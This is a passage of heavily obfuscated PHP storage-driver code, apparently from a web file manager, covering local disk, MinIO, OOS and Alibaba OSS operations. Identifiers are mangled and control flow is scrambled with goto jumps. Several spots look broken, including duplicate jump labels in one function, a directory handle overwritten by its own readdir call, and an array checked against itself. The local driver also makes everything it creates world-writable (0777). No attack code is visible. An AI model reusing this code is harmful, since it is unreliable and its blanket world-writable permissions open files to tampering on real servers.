$_SERVER[̉][1246]) { $F̌߉ = BASIC_PATH . substr($F̌߉, 2); } return $F̌߉; } public function iconvApp($E՜) { $cִ෋ =& $_SERVER[̉]; global $config; return $this->iconvTo($E՜, $config[$cִ෋[1244]], $config[$cִ෋[1243]]); } public function iconvSystem($D҆) { $bޢ糐 =& $_SERVER[̉]; global $config; return $this->iconvTo($D҆, $config[$bޢ糐[1243]], $config[$bޢ糐[1244]]); } public function getPathOuter($d܌) { goto b̾; F: return $this->pathDriver . $a򖔅[8] . ltrim($d܌, $a򖔅[8]); goto b; cҹ: if (substr($c, 0, 2) == $a򖔅[1246]) { $c = BASIC_PATH . substr($c, 2); } if (substr($d܌, 0, 2) == $a򖔅[1246]) { $d܌ = BASIC_PATH . substr($d܌, 2); } $c = KodIO::clear($c); goto B쐅; b̾: $a򖔅 =& $_SERVER[̉]; $c = $this->iconvApp($this->pathBase); $d܌ = $this->iconvApp($d܌); goto cҹ; B쐅: $d܌ = KodIO::clear($d܌); $d܌ = substr($d܌, strlen($c)); if (empty($this->pathDriver)) { return $d܌; } goto F; b: } public function mkfile($d⠆, $Dғ = '', $Bڿ = REPEAT_RENAME) { $d⠆ = $this->iconvSystem($d⠆); @touch($d⠆); if ($Dғ) { file_put_contents($d⠆, $Dғ); } @chmod($d⠆, 511); return is_file($d⠆) ? $this->getPathOuter($d⠆) : !1; } public function mkdir($Bь, $Fʧ = REPEAT_SKIP) { $Bь = $this->iconvSystem($Bь); if (is_dir($Bь)) { return $this->getPathOuter($Bь); } @mkdir($Bь, 511, !0); @chmod($Bь, 511); return is_dir($Bь) ? $this->getPathOuter($Bь) : !1; } public function copyFile($BǑ, $a懕) { $this->mkdir($this->pathFather($a懕)); $BǑ = $this->iconvSystem($BǑ); $a懕 = $this->iconvSystem($a懕); $bʂ = copy_64($BǑ, $a懕); @chmod($a懕, 511); return $bʂ ? $this->getPathOuter($a懕) : !1; } public function moveFile($e۷, $e) { goto EŬ; EŬ: $this->mkdir($this->pathFather($e)); $e۷ = $this->iconvSystem($e۷); $e = $this->iconvSystem($e); goto B; B: $e㵉 = intval(@rename($e۷, $e)); if (!$e㵉) { if ($e㵉 = intval(@copy_64($e۷, $e))) { @unlink($e۷); } } @chmod($e, 511); goto Dȇ; Dȇ: return $e㵉 ? $this->getPathOuter($e) : !1; goto F窊; F窊: } public function delFile($aٱ) { $aٱ = $this->iconvSystem($aٱ); if (!@unlink($aٱ)) { @chmod($aٱ, 511); if (!@unlink($aٱ)) { return !1; } } else { return !0; } } public function delFolder($F) { goto dᲉ; dᲉ: $A˔ =& $_SERVER[̉]; $F = $this->iconvSystem($F); if (!is_dir($F)) { return !0; } goto cȬ; cȬ: if (!($Fٶ̏ = opendir($F))) { return !1; } while (($FÂ = readdir($Fٶ̏)) !== !1) { if ($FÂ == $A˔[95] || $FÂ == $A˔[1253]) { continue; } $fĕ = $F . $A˔[8] . $FÂ; if (is_file($fĕ) || is_link($fĕ)) { if (!unlink($fĕ)) { chmod($fĕ, 511); if (!unlink($fĕ)) { return !1; } } } else { if (is_dir($fĕ)) { chmod($fĕ, 511); $fĕ = $this->iconvApp($fĕ); if (!$this->delFolder($fĕ)) { return !1; } } } } closedir($Fٶ̏); goto F; F: return rmdir($F); goto Cִ; Cִ: } public function rename($bƃ, $Eߊ) { goto d҃; A: $EՄ = @rename($bƃ, $dފ); $dފ = $this->iconvApp($dފ); return $EՄ ? $this->getPathOuter($dފ) : !1; goto AË; d҃: $b˃ =& $_SERVER[̉]; $eˏ = $this->fileNameAuto($this->pathFather($bƃ), $Eߊ); $eˏ = $this->iconvSystem($eˏ); goto D׮; D׮: $bƃ = $this->iconvSystem($bƃ); $fܳ = $this->pathFather($bƃ); $dފ = rtrim($fܳ, $b˃[8]) . $b˃[8] . $eˏ; goto A; AË: } public function size($bذנ) { $bذנ = $this->iconvSystem($bذנ); return filesize_64($bذנ); } public function info($Bʹɉ) { $Bʹɉ = $this->iconvSystem($Bʹɉ); if ($this->isFolder($Bʹɉ)) { return $this->folderInfo($Bʹɉ); } else { if ($this->isFile($Bʹɉ)) { return $this->fileInfo($Bʹɉ); } } return !1; } protected function infoChildren($D˵, &$F, $D׭֯ = true) { goto C; C: $Fǅú =& $_SERVER[̉]; check_abort_echo(); $D˵ = rtrim($D˵, $Fǅú[8]) . $Fǅú[8]; goto A; eڐ˒: closedir($CҤ); goto B΅; A: if ($D׭֯) { $D˵ = $this->iconvSystem($D˵); } if (!($CҤ = @opendir($D˵))) { return; } while (($dΣϹ = readdir($CҤ)) !== !1) { if ($dΣϹ == $Fǅú[95] || $dΣϹ == $Fǅú[1253]) { continue; } $bļ = $D˵ . $dΣϹ; if (is_file($bļ) || is_link($bļ)) { $F[$Fǅú[79]]++; $F[$Fǅú[78]] += filesize_64($bļ); } else { if (is_dir($bļ)) { $F[$Fǅú[80]]++; $this->infoChildren($bļ, $F, !1); } } } goto eڐ˒; B΅: } private function folderInfo($d, $F = false) { $C =& $_SERVER[̉]; $d = rtrim($d, $C[8]) . $C[8]; $b詬 = $this->iconvApp($this->pathThis($d)); if ($F) { return array($C[28] => $b詬, $C[76] => $this->getPathOuter($d), $C[29] => $C[77]); } $a = array($C[28] => $b詬, $C[76] => $this->getPathOuter($d), $C[29] => $C[77], $C[194] => @filectime($d), $C[84] => @filemtime($d), $C[1256] => @fileatime($d), $C[1257] => is_readable($d), $C[1258] => is_writable($d), $C[1259] => get_mode($d)); return $a; } private function fileInfo($CĐ, $Aж = false) { $EҧȂ =& $_SERVER[̉]; $a = $this->iconvApp($this->pathThis($CĐ)); if ($Aж) { return array($EҧȂ[28] => $a, $EҧȂ[76] => $this->getPathOuter($CĐ), $EҧȂ[29] => $EҧȂ[193], $EҧȂ[78] => $this->size($CĐ), $EҧȂ[168] => $this->ext($a)); } $C̄ = array($EҧȂ[28] => $a, $EҧȂ[76] => $this->getPathOuter($CĐ), $EҧȂ[29] => $EҧȂ[193], $EҧȂ[194] => @filectime($CĐ), $EҧȂ[84] => @filemtime($CĐ), $EҧȂ[1256] => @fileatime($CĐ), $EҧȂ[78] => $this->size($CĐ), $EҧȂ[168] => $this->ext($a), $EҧȂ[1257] => is_readable($CĐ), $EҧȂ[1258] => is_writable($CĐ), $EҧȂ[1259] => get_mode($CĐ)); return $C̄; } public function exist($fεВ) { $fεВ = $this->iconvSystem($fεВ); return @file_exists($fεВ); } public function isFile($Fݿ) { $Fݿ = $this->iconvSystem($Fݿ); return @is_file($Fݿ); } public function isFolder($fڪ©) { $fڪ© = $this->iconvSystem($fڪ©); return @is_dir($fڪ©); } public function listPath($d䈽ɶ, $b情 = false) { goto dן; dן: $e߯ =& $_SERVER[̉]; $d䈽ɶ = $this->iconvSystem($d䈽ɶ); $d䈽ɶ = rtrim($d䈽ɶ, $e߯[8]) . $e߯[8]; goto dѿЦ; dѿЦ: $D֤ = array($e߯[75] => array(), $e߯[74] => array()); if (!($fܼ = @opendir($d䈽ɶ))) { return $D֤; } while (($C = readdir($fܼ)) !== !1) { if ($C == $e߯[95] || $C == $e߯[1253]) { continue; } $E󢐖 = $d䈽ɶ . $C; if (is_file($E󢐖)) { $D֤[$e߯[74]][] = $this->fileInfo($E󢐖, $b情); } else { $D֤[$e߯[75]][] = $this->folderInfo($E󢐖, $b情); } } goto c; c: closedir($fܼ); return $D֤; goto bÔ; bÔ: } public function listAll($bФ, &$A = array()) { goto aچ; aچ: $eʎ֮ =& $_SERVER[̉]; $bФ = $this->iconvSystem($bФ); $bФ = rtrim($bФ, $eʎ֮[8]) . $eʎ֮[8]; goto Cݼ; CԶ: return $A; goto fᅃ; Cݼ: if (!($cѷ = @opendir($bФ))) { return $A; } while (($e = readdir($cѷ)) !== !1) { if ($e == $eʎ֮[95] || $e == $eʎ֮[1253]) { continue; } $A趋 = $bФ . $e; if (is_dir($A趋) && !is_link($A趋)) { $A[] = array($eʎ֮[76] => $A趋 . $eʎ֮[8], $eʎ֮[77] => 1, $eʎ֮[84] => @filemtime($A趋), $eʎ֮[78] => 0); $this->listAll($A趋, $A); } else { $A[] = array($eʎ֮[76] => $A趋, $eʎ֮[77] => 0, $eʎ֮[84] => @filemtime($A趋), $eʎ֮[78] => $this->size($A趋)); } } closedir($cѷ); goto CԶ; fᅃ: } public function has($cǂō, $b񑻉 = false, $c֔ժ = true) { goto D˕; D㊍䠋: if ($b񑻉) { return array($c©[203] => $eǗ͒, $c©[204] => $aٞ); } return !1; goto eǼɂ; bٸˑ: if (!($f = @opendir($cǂō))) { return !1; } $eǗ͒ = 0; $aٞ = 0; goto dՏ; D˕: $c© =& $_SERVER[̉]; $cǂō = $this->iconvSystem($cǂō); $cǂō = rtrim($cǂō, $c©[8]) . $c©[8]; goto bٸˑ; dՏ: $B̈́ꌦ = 0; while (($f = readdir($f)) !== !1) { if ($f == $c©[95] || $f == $c©[1253]) { continue; } $eʐ = $cǂō . $f; if ($b񑻉) { $B̈́ꌦ++; if (@is_file($eʐ)) { $eǗ͒++; } else { $aٞ++; } if ($B̈́ꌦ > 10000) { break; } continue; } if ($c֔ժ) { if (@is_file($eʐ)) { return !0; } } else { if (@is_dir($eʐ . $c©[8])) { return !0; } } } closedir($f); goto D㊍䠋; eǼɂ: } public function hashSimple($c՝ب) { goto Dᚂ; Cȇğ: fseek_64($BϘލ, $fϸ - $a); $C .= fread($BϘލ, $a); fclose($BϘލ); goto DѲ; DѲ: return md5($C) . $fϸ; goto eĤ; E: $BϘލ = fopen($c՝ب, $C铟ۯ[1260]); if (!$BϘލ) { return $C; } for ($cѼ = 0; $cѼ < $eĝ; $cѼ++) { fseek_64($BϘލ, $fߡ * $cѼ); $C .= fread($BϘލ, $a); } goto Cȇğ; B̵׆: if ($fϸ <= $a * $eĝ) { return $this->hashMd5($c՝ب) . $fϸ; } $C = $C铟ۯ[33]; $fߡ = intval($fϸ / $eĝ); goto E; f: $fϸ = $this->size($c՝ب); $a = 200; $eĝ = 50; goto B̵׆; Dᚂ: $C铟ۯ =& $_SERVER[̉]; if (!$c՝ب) { return md5($C铟ۯ[33]); } $c՝ب = $this->iconvSystem($c՝ب); goto f; eĤ: } public function getContent($CȬ) { $CȬ = $this->iconvSystem($CȬ); return file_get_contents($CȬ); } public function setContent($Bĵ, $BɋǺ՘ = '') { $Bĵ = $this->iconvSystem($Bĵ); $A = @file_put_contents($Bĵ, $BɋǺ՘, LOCK_EX); clearstatcache(); @chmod($Bĵ, 511); return $A === !1 ? !1 : !0; } public function fileSubstr($e爚, $F˃ = 0, $Eۅ = false) { goto Eū; aŽ: if ($Eۅ <= 0) { return $Fӈ[33]; } $F = fopen($e爚, $Fӈ[1260]); if (!$F) { return !1; } goto B㊹; Eū: $Fӈ =& $_SERVER[̉]; $e爚 = $this->iconvSystem($e爚); if ($Eۅ === !1) { $Eۅ = $this->size($e爚); } goto aŽ; B㊹: fseek_64($F, $F˃); $aԇޏ = fread($F, $Eۅ); fclose($F); goto B誄; B誄: return $aԇޏ; goto a; a: } public function upload($Aܪ, $F, $Eɂ = false, $Bؼ = REPEAT_REPLACE) { if ($Eɂ) { return $this->moveFile($F, $Aܪ); } return $this->copyFile($F, $Aܪ); } public function setModifyTime($d߲ٵ, $cކ = '') { @touch($d߲ٵ, intval($cކ)); } public function download($F, $D) { return $this->iconvSystem($F); } } goto Bԏ; Bԏ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fǨ) { parent::__construct($fǨ); $this->signatureVersion($_SERVER[̉][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($C邪) { parent::__construct($C邪); $this->signatureVersion($_SERVER[̉][212]); } public function fileOutLink($fڱ) { $Fم =& $_SERVER[̉]; if (substr($fڱ, 0, 7) == $Fم[1203]) { $fڱ = $Fم[1204] . substr($fڱ, 7); } header($Fم[159] . $fڱ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($f) { parent::__construct(); include_once SDK_DIR . $_SERVER[̉][1261]; $this->_init($f); } public function _init($E) { $dדʟ =& $_SERVER[̉]; foreach ($E as $D => $cϺ) { if (isset($this->{$D})) { $this->{$D} = $cϺ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($dדʟ[1262] . LNG($dדʟ[1263])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto B; C̼: $E؍->addAllowedMethod($C[1267]); $E؍->addAllowedMethod($C[1268]); $E؍->addAllowedMethod($C[158]); goto Aۯӣ; b: $E؍->addAllowedOrigin($C[1264]); $E؍->addAllowedMethod($C[1265]); $E؍->addAllowedMethod($C[1266]); goto C̼; e: $Fʴ->addRule($E؍); try { $this->client->putBucketCors($this->bucket, $Fʴ); } catch (OSS\Core\OssException $bǒ) { return !1; } return !0; goto b͆; B: $C =& $_SERVER[̉]; $Fʴ = new OSS\Model\CorsConfig(); $E؍ = new OSS\Model\CorsRule(); goto b; Aۯӣ: $E؍->setMaxAgeSeconds(600); $E؍->addExposeHeader($C[1269]); $E؍->addAllowedHeader($C[1264]); goto e; b͆: } public function getBucketCors() { goto E; d: if (!$D޸ || !($Fُ = $D޸->getRules())) { return null; } $fޙ = $Fُ[0]->getAllowedOrigins(); $d = $Fُ[0]->getAllowedMethods(); goto b쎊; b쎊: $c = $Fُ[0]->getMaxAgeSeconds(); $eξ = $Fُ[0]->getExposeHeaders(); $eÓ٦ = $Fُ[0]->getAllowedHeaders(); goto B۬; E: $dص =& $_SERVER[̉]; $D޸ = null; try { $D޸ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $bތ) { return null; } goto d; B۬: return array($dص[181] => isset($fޙ[0]) ? $fޙ[0] : $dص[33], $dص[185] => $d, $dص[1270] => $c, $dص[1271] => isset($eξ[0]) ? $eξ[0] : $dص[33], $dص[183] => isset($eÓ٦[0]) ? $eÓ٦[0] : $dص[33]); goto cό; cό: } public function isBucketCors() { goto dₐ; b썝꠴: $f掭 = array($fǍ[186], $fǍ[187], $fǍ[188], $fǍ[189], $fǍ[190]); $F = array_diff($f掭, $F󏅸); return empty($F); goto bƐ; dԦ: if ($A[$fǍ[181]] != $fǍ[182] || $A[$fǍ[183]] != $fǍ[182]) { return !1; } $F󏅸 = array_map($fǍ[184], $A[$fǍ[185]]); if (!is_array($F󏅸)) { $F󏅸 = array(); } goto b썝꠴; dₐ: $fǍ =& $_SERVER[̉]; $A = $this->getBucketCors(); if (!$A || !is_array($A)) { return !1; } goto dԦ; bƐ: } public function mkfile($cɋ, $aհ҄ = '', $f턵 = REPEAT_RENAME) { $F = $this->setContent($cɋ, $aհ҄); if ($F !== !1) { return $this->getPathOuter($cɋ); } return !1; } public function mkdir($Aזζ, $F䠈 = REPEAT_SKIP) { if ($this->_isFolder($Aזζ)) { return $this->getPathOuter($Aזζ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Aזζ)); } catch (OSS\Core\OssException $D璏) { return !1; } return $this->getPathOuter($Aזζ); } private function fileList($b, $EЍ = '', $Cǔ˥ = 0) { goto e; cޚ: return array($fگ[75] => $Eӂ󦲊, $fگ[74] => $Bôȡ); goto A푅; Dɶ: $Eӂ󦲊 = $Bôȡ = array(); while (!0) { check_abort(); $bߜȐ = array($fگ[1272] => $EЍ, $fگ[1273] => $D, $fگ[1274] => $Dĵ, $fگ[1275] => $B¹); try { $eޛ = $this->client->listObjects($this->bucket, $bߜȐ); } catch (OSS\Core\OssException $fԽŴ) { break; } $B¹ = $eޛ->getNextMarker(); $Aփ洯 = $eޛ->getObjectList(); $D = $eޛ->getPrefixList(); foreach ($Aփ洯 as $D) { goto eݺ; f: $aŸ = $D->getLastModified(); $DΞ = $Cǔ˥ ? array($fگ[28] => $B룥܂, $fگ[78] => $b, $fگ[197] => strtotime($aŸ)) : $B룥܂; $EЉ = $b == 0 && substr($B룥܂, strlen($B룥܂) - 1, 1) == $fگ[8] ? !0 : !1; goto A̤͘Ě; eݺ: if ($D->getKey() == $D) { continue; } $B룥܂ = $D->getKey(); $b = $D->getSize(); goto f; A̤͘Ě: if ($E䊫) { $this->cacheMethod($fگ[199], $B룥܂, $EЉ); $this->cacheMethod($fگ[200], $B룥܂, array($fگ[78] => $b, $fگ[1276] => $b, $fگ[84] => strtotime($aŸ), $fگ[1277] => $aŸ)); } if ($EЉ) { $Eӂ󦲊[] = $B룥܂; continue; } $Bôȡ[] = $DΞ; goto eў; eў: } foreach ($D as $f気) { $Eӂ󦲊[] = $f気->getPrefix(); if ($E䊫) { $this->cacheMethod($fگ[199], $B룥܂, !0); } } if ($B¹ === $fگ[33]) { break; } } if ($E䊫) { $this->cacheMethod($fگ[199], $b, !0); } goto cޚ; D: $B¹ = $fگ[33]; $Dĵ = 1000; $E䊫 = $this->listItemCache === !1 ? !1 : !0; goto Dɶ; e: $fگ =& $_SERVER[̉]; $b = trim($b, $fگ[8]); $D = empty($b) && $b !== $fگ[191] ? $fگ[33] : $b . $fگ[8]; goto D; A푅: } public function copyFile($a, $bԿ) { $B = $this->size($a); if ($B < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $a, $this->bucket, $this->pathEncode($bԿ)); } catch (OSS\Core\OssException $D裈Ą) { return !1; } return $this->getPathOuter($bԿ); } $c = $this->multiCopyObject($a, $bԿ, $B); return $c ? $this->getPathOuter($bԿ) : !1; } private function multiCopyObject($bۛˬ, $d, $Eʮű) { $B΋ =& $_SERVER[̉]; try { goto d; A: $cǋ = array(); foreach ($cݷ as $E => $EГ) { $cǋ[] = array($B΋[1282] => $E + 1, $B΋[1283] => $EГ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($d), $E߇, $cǋ); goto d趫; d: $aÂӞ = array(); if ($f݋ = $this->hashMd5($bۛˬ)) { $aÂӞ = array(OSS\OssClient::OSS_HEADERS => array($B΋[1278] => $f݋)); } $E߇ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($d), $aÂӞ); goto F͞; A: $F = 1024 * 1024 * 10; $F¬͑ = $this->client->generateMultiuploadParts($Eʮű, $F); foreach ($F¬͑ as $E => $BώǛ) { $dЩܕ = $Bٳ + (int) $BώǛ[$B΋[1279]]; $f = (int) $BώǛ[$B΋[335]] + $dЩܕ - 1; $eņ = array($B΋[1280] => $dЩܕ, $B΋[1281] => $f); $cݷ[] = $this->client->uploadPartCopy($this->bucket, $bۛˬ, $this->bucket, $this->pathEncode($d), $b䠖, $E߇, $eņ); $b䠖 = $b䠖 + 1; } goto A; F͞: $b䠖 = 1; $Bٳ = 0; $cݷ = array(); goto A; d趫: } catch (OSS\Core\OssException $fِ) { return !1; } return !0; } public function moveFile($E٦, $cу) { if ($this->copyFile($E٦, $cу)) { $this->remove($E٦); return $this->getPathOuter($cу); } return !1; } public function delFile($d) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($d)); } catch (OSS\Core\OssException $aˈ) { return !1; } return !0; } public function delFolder($Céǎ) { goto b⭪; E: $Dײ = $this->delByBatch($dϐƲː[$Eӱ[75]]); if (!$Dײ) { return !1; } return $this->delFile($D); goto a͒; b⭪: $Eӱ =& $_SERVER[̉]; if (!$this->exist($Céǎ)) { return !0; } $this->listItemCache = !1; goto bѡ; bѡ: $dϐƲː = $this->fileList($Céǎ); $this->listItemCache = !0; $D = trim($Céǎ, $Eӱ[8]) . $Eӱ[8]; goto f; f: if (!empty($Céǎ) && $Céǎ !== $Eӱ[191] && !in_array($D, $dϐƲː[$Eӱ[75]])) { $dϐƲː[$Eӱ[75]][] = $D; } $Dײ = $this->delByBatch($dϐƲː[$Eӱ[74]]); if (!$Dײ) { return !1; } goto E; a͒: } private function delByBatch($D캻) { foreach (array_chunk($D캻, 1000) as $bі) { try { $this->client->deleteObjects($this->bucket, $bі); } catch (OSS\Core\OssException $E) { return !1; } } return !0; } public function rename($a, $a눟) { return $this->renameObject($a, $a눟); } private function fileInfo($f煐§, $B = false, $f̫ = array()) { goto Fɟ¦; aփ۽: $cƏ[$fȂ[194]] = $cƏ[$fȂ[84]] = 0; $cƏ[$fȂ[195]] = $cƏ[$fȂ[196]] = !0; if (empty($f̫)) { $F = $this->objectMeta($f煐§); if (!$F) { return $cƏ; } $f̫ = array($fȂ[84] => strtotime($F[$fȂ[1277]]), $fȂ[78] => $F[$fȂ[1276]] + 0); } goto b; Fɟ¦: $fȂ =& $_SERVER[̉]; $cƏ = array($fȂ[28] => $this->pathThis($f煐§), $fȂ[76] => $this->getPathOuter($f煐§), $fȂ[29] => $fȂ[193], $fȂ[78] => isset($f̫[$fȂ[78]]) ? $f̫[$fȂ[78]] : 0, $fȂ[168] => $this->ext($f煐§)); if ($B) { return $cƏ; } goto aփ۽; Fʘ: return $cƏ; goto Bʆ; b: if (isset($f̫[$fȂ[78]])) { $cƏ[$fȂ[78]] = $f̫[$fȂ[78]]; } if (isset($f̫[$fȂ[84]])) { $cƏ[$fȂ[84]] = $f̫[$fȂ[84]]; } if (isset($f̫[$fȂ[197]]) && !trim($cƏ[$fȂ[84]])) { $cƏ[$fȂ[84]] = $f̫[$fȂ[197]]; } goto Fʘ; Bʆ: } private function folderInfo($Aӓ, $eϭ = false, $c͂ = array()) { goto cҩ; c쉰: if (isset($c͂[$A톗[84]])) { $D̸[$A톗[84]] = $c͂[$A톗[84]]; } if (isset($c͂[$A톗[194]])) { $D̸[$A톗[194]] = $c͂[$A톗[194]]; } return $D̸; goto Cχކ; d©Ɍ: $D̸[$A톗[194]] = $D̸[$A톗[84]] = 0; $D̸[$A톗[195]] = $D̸[$A톗[196]] = !0; if (empty($c͂)) { $Aӓ = rtrim($Aӓ, $A톗[8]) . $A톗[8]; $C = $this->objectMeta($Aӓ); if (!$C) { return $D̸; } $c͂ = array($A톗[194] => $C[$A톗[1284]][$A톗[1285]], $A톗[84] => strtotime($C[$A톗[1277]])); } goto c쉰; cҩ: $A톗 =& $_SERVER[̉]; $D̸ = array($A톗[28] => $this->pathThis($Aӓ), $A톗[76] => $this->getPathOuter($A톗[8] . $Aӓ), $A톗[29] => $A톗[77]); if ($eϭ) { return $D̸; } goto d©Ɍ; Cχކ: } public function listPath($A, $c븇 = false) { $A᳧ =& $_SERVER[̉]; $dշ = $this->fileList($A, $A᳧[8], !0); foreach ($dշ[$A᳧[75]] as $F˞ => $c޸Ї) { $dշ[$A᳧[75]][$F˞] = $this->folderInfo($c޸Ї, $c븇, $c޸Ї); } foreach ($dշ[$A᳧[74]] as $F˞ => $c޸Ї) { $dշ[$A᳧[74]][$F˞] = $this->fileInfo($c޸Ї[$A᳧[28]], $c븇, $c޸Ї); } return $dշ; } public function has($Aу, $cѸ = false, $EС = true) { goto A; A: $dӪڎ =& $_SERVER[̉]; $Aу = trim($Aу, $dӪڎ[8]); $e = empty($Aу) && $Aу !== $dӪڎ[191] ? $dӪڎ[33] : $Aу . $dӪڎ[8]; goto FҶ; B݂: while (!0) { check_abort(); $a򸡲 = array($dӪڎ[1272] => $dӪڎ[8], $dӪڎ[1273] => $e, $dӪڎ[1274] => $dΏ, $dӪڎ[1275] => $dп); try { $f = $this->client->listObjects($this->bucket, $a򸡲); } catch (OSS\Core\OssException $cӍ݆) { break; } $dп = $f->getNextMarker(); $A䗝 = $f->getObjectList(); $bш = $f->getPrefixList(); if ($cѸ) { if (count($A䗝) > 1 || count($A䗝) == 1 && $A䗝[0]->getKey() != $e) { $a += count($A䗝) - 1; } if (!empty($bш)) { $dˋ += count($bш); } if ($dп === $dӪڎ[33]) { break; } continue; } if ($EС) { if (!empty($A䗝)) { if (count($A䗝) > 1 || $A䗝[0]->getKey() != $e) { return !0; } } } else { if (!empty($bш)) { return !0; } } if ($dп === $dӪڎ[33]) { break; } } if ($cѸ) { return array($dӪڎ[203] => $a, $dӪڎ[204] => $dˋ); } return !1; goto A; FҶ: $dп = $dӪڎ[33]; $dΏ = 500; $a = $dˋ = 0; goto B݂; A: } public function listAll($fՏ) { $dě =& $_SERVER[̉]; $D薄 = $this->fileList($fՏ, $dě[33], !0); $Cɺ = array(); foreach ($D薄[$dě[74]] as $aÐ׈) { $Cɺ[$aÐ׈[$dě[28]]] = $aÐ׈[$dě[78]]; } foreach ($D薄[$dě[75]] as $aÐ׈) { if (is_string($aÐ׈)) { $Cɺ[$aÐ׈] = 0; } } return $this->listAllFiles($fՏ, array_keys($Cɺ), $Cɺ); } public function canRead($B̪) { $c =& $_SERVER[̉]; $AŃ = $this->pathAcl($B̪); return $AŃ == $c[1286] || $AŃ == $c[519] ? !0 : !1; } public function canWrite($F) { $dȄ޴ = $this->pathAcl($F); return $dȄ޴ == $_SERVER[̉][519] ? !0 : !1; } public function pathAcl($a򜵸) { goto Fȱ; Cߖ: $d = $c٘ == $b[34] ? $this->bucketAcl : $c٘; if ($d == $b[1287]) { return $b[1286]; } if ($d == $b[1288]) { return $b[519]; } goto b; Fȱ: $b =& $_SERVER[̉]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $c٘ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($a򜵸)); } catch (OSS\Core\OssException $Cޖ) { return !1; } goto Cߖ; b: return $d; goto bԅ; bԅ: } private function chmodPath($a, $CѦ = '') { $Fб׳ =& $_SERVER[̉]; $a = empty($CѦ) ? $Fб׳[1288] : $CѦ; $a = array($Fб׳[34], $Fб׳[192], $Fб׳[1287], $Fб׳[1288]); if (!in_array($a, $a)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($a), $a); } catch (OSS\Core\OssException $AȮ) { return !1; } return !0; } public function getContent($aÍ) { return $this->fileSubstr($aÍ, -1); } public function setContent($aβ, $eދغ = '') { $Cʑ =& $_SERVER[̉]; try { $C = $this->trafficLimit($Cʑ[1289]); $E = $this->client->putObject($this->bucket, $this->pathEncode($aβ), $eދغ, $C); } catch (OSS\Core\OssException $e) { return !1; } $aÇ = array($Cʑ[1278] => trim($E[$Cʑ[1290]], $Cʑ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($aβ))); $this->updateObjMeta($aβ, $aÇ); return isset($E[$Cʑ[1291]][$Cʑ[1237]]) ? !0 : !1; } private function updateObjMeta($a, $b) { $a = $this->pathEncode($a); try { $B = array(OSS\OssClient::OSS_HEADERS => $b); $this->client->copyObject($this->bucket, $a, $this->bucket, $a, $B); } catch (OSS\Core\OssException $f̥) { return !1; } return !0; } public function upload($a҃, $c, $aΏ = false, $dۃ = REPEAT_REPLACE) { $B嚌 =& $_SERVER[̉]; $d = trim($a҃, $B嚌[8]); $bψ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($B嚌[1278] => @md5_file($c)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($a҃))); $bψ = $this->trafficLimit($B嚌[1289], $bψ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($d), $c, $bψ); } catch (OSS\Core\OssException $EϿ) { return !1; } return $this->getPathOuter($a҃); } public function getHost() { $C =& $_SERVER[̉]; $Aυ = explode($C[177], parent::getHost()); return $Aυ[0] . $C[177] . $this->bucket . $C[95] . $Aυ[1]; } public function uploadFormData($e߬, $aƊ = 3600) { goto C֨; E: $cԍՓ = date($E[1292], time() + $E); $F׏ņ = new DateTime($cԍՓ); $D؏Ӽ = $F׏ņ->format(DateTime::ISO8601); goto dȊ; b: $bƂȆ = $this->pathFather($e߬); $dд = array($E[1190] => $D؏Ӽ, $E[1191] => array(array($E[1294], 0, $f), array($E[1194], $E[1195], $bƂȆ))); $d = base64_encode(json_encode($dд)); goto A; C֨: $E =& $_SERVER[̉]; if (!($a = $this->getHost())) { return !1; } $E = $aƊ; goto E; dȊ: $DҮŎэ = strpos($D؏Ӽ, $E[294]); $D؏Ӽ = substr($D؏Ӽ, 0, $DҮŎэ) . $E[1293]; $f = 1048576000 * 5; goto b; A: $Eٮ΋ = base64_encode(hash_hmac($E[230], $d, $this->secret, !0)); $e = array($E[1200] => $d, $E[1295] => $this->accessKey, $E[1196] => $E[1188], $E[1296] => $Eٮ΋, $E[175] => $a); $e = $this->trafficLimit($E[1289], $e); goto Cū; Cū: return $e; goto f⼨; f⼨: } public function multiUploadFormData($BͿ, $A = 3600) { $E =& $_SERVER[̉]; if (!($dԍ = $this->getHost())) { return !1; } $e = $this->trafficLimit($E[1289]); $Eʭ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($BͿ), $e); return array($E[221] => $Eʭ, $E[175] => $dԍ . $E[8] . $this->pathEncode($BͿ), $E[222] => gmdate($E[1297]), $E[93] => $BͿ); } public function multiUploadAuthData($dǡ, $cߪ = array()) { goto a; dڐ: $F߶ = $dǡ; if (isset($cߪ[$b[93]])) { $F߶ = $cߪ[$b[93]]; unset($cߪ[$b[93]]); } if (isset($cߪ[$b[223]])) { $cߪ[$b[222]] = $C; return $this->listUploadParts($F߶, $cߪ); } goto Eґﺫ; Bઉ: if (!empty($cߪ[$b[1299]])) { $Eɭ = array_merge(array($cծ[4]), $cߪ[$b[1299]]); sort($Eɭ); $cծ[4] = implode($b[229], $Eɭ); } $Dͣ = implode($b[229], $cծ); $eǐ = base64_encode(hash_hmac($b[230], $Dͣ, $this->secret, !0)); goto c; Eґﺫ: $cծ = array($b[224], $b[33], $b[119], $C, "\x78\55\157\163\163\55\144\x61\164\x65\x3a{$C}", 